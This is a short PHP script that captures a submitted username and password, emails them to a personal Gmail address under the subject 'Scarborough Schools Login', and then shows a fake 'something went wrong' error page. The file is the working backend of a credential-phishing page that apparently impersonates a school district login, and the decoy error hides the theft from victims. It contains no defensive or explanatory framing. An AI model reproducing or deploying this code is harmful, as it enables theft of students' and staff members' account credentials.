<?php

$username = $_REQUEST['username'];

$password = $_REQUEST['password'];


$message = 'Username: '.$username.'  Password: '.$password;

mail('nick.salve@gmail.com', 'Scarborough Schools Login', $message, 'From: noreply@none.com');
?>



<html>

We're sorry. Something went wrong. Please contact your system administrator if this problem continues.

</html>

